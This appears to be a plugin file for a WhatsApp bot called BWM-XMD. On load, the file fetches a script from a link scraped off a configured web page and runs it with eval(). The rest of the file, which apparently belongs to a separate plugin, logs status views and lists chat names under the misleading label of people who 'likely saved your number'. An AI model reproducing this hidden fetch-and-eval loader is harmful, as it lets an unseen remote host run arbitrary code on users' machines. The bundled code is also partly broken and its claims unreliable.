//  [BWM-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Ibrahim Adams                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require("./config");

async function fetchBODYUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("BODY")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('heart not found 😭');
    }

    console.log('The heart is loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchBODYUrl();
const fs = require('fs');
const path = './status-log.json';

// Load or initialize the log
let statusLog = {};
if (fs.existsSync(path)) {
  statusLog = JSON.parse(fs.readFileSync(path));
}

// When a message is a status view
bot.ev.on('status-viewed', async (user) => {
  const jid = user.id;
  if (!statusLog[jid]) {
    statusLog[jid] = 1;
  } else {
    statusLog[jid]++;
  }
  fs.writeFileSync(path, JSON.stringify(statusLog, null, 2));
});

// Command: .statuswatch
bot.command({ pattern: 'statuswatch', fromMe: true }, async (message, match) => {
  let text = '👁️ *Status Watcher Report:*\n\n';
  const sorted = Object.entries(statusLog).sort((a, b) => b[1] - a[1]);

  for (const [jid, count] of sorted) {
    text += `👤 ${jid} viewed ${count} time(s)\n`;
  }

  await message.sendMessage(text);
});

// Command: .guesssavedme
bot.command({ pattern: 'guesssavedme', fromMe: true }, async (message, match) => {
  const allChats = await bot.chats.all();
  let result = '📇 *People who likely saved your number:*\n\n';

  for (const chat of allChats) {
    const { id, name } = chat;
    if (name && !id.includes('broadcast')) {
      result += `✅ ${name} (${id})\n`;
    }
  }

  await message.sendMessage(result || '❌ No contacts found that clearly saved you.');
});